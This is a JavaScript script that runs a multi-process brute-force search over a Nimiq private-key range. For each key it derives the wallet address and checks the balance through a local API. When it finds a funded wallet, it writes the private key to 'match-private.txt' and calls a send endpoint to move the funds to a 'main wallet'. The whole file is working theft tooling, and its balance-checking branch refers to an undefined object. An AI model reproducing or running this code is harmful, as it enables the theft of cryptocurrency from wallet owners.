const fs = require('fs');
const cluster = require('cluster');
const { default: axios } = require('axios');
const Wallet = require('./wallet');
const argv = require('minimist')(process.argv.slice(2));

(async () => {
  // args
  const numCPUs = argv?.t || 2;
  const range = argv?.r || "1000000000:ffffffffff";
  const addressToCheckBalance = argv?.b || null;

  // Check balance
  if (addressToCheckBalance) {
    wrapper.accountHelper.getBalance(addressToCheckBalance, function(b) {
      const balance = b / 100000;
      console.log(`\n------ Balance Checker -------\n`);
      console.log(`\x1b[32m${addressToCheckBalance} : ${balance} NIM\x1b[0m`);
      console.log(`\n------ Balance Checker -------\n`);
      process.exit(0);
    })

    return;
  }

  // Main
  if (cluster.isMaster) {
    const [rangeStart = "1", rangeEnd = "1fffffffff"] = range.split(":");
    const start = "0".repeat(64 - rangeStart.length) + rangeStart
    const end = rangeEnd + "0".repeat(64 - rangeEnd.length)
      
    for (let i = 0; i < numCPUs; i++) {
      cluster.fork({ START_KEY: `0x${start}`, END_KEY: `0x${end}` });
    }

    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died`);
    });
  } else {
    const send = async (privateKey) => {
      try {
        const res = await axios.get(`http://127.0.0.1:8088/api/v1/send/${privateKey}`)
        return res.data;
      } catch (error) {
        return null;
      }
    }
    
    const getBalance = async (address) => {
      try {
        const res = await axios.get(`http://127.0.0.1:8088/api/v1/balance/${address}`)
        return res.data.balance;
      } catch (error) {
        console.log(error);
        return -1;
      }
    }

    const START_KEY = BigInt(process.env.START_KEY);
    const END_KEY = BigInt(process.env.END_KEY);
    const WORKER_INDEX = cluster.worker.id;

    let founds = 0;
    let start = START_KEY + (BigInt(WORKER_INDEX - 1));

    for (let key = start; key <= END_KEY; key = key + BigInt(numCPUs)) {
      const privateKeyHex = key.toString(16).padStart(64, '0');
      const wallet = Wallet.fromPrivateKey(privateKeyHex)
      const address = wallet.getAddress();
      const balance = await getBalance(address);

      if (balance > 0) {
        founds++;
        console.info(`\x1b[32mFounds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);

        // Write to file
        var successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
        fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));

        // Create transaction to main wallet
        await send(privateKeyHex);
      } else {
        console.info(`\x1b[35mFounds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
      }
    }
  }
})()
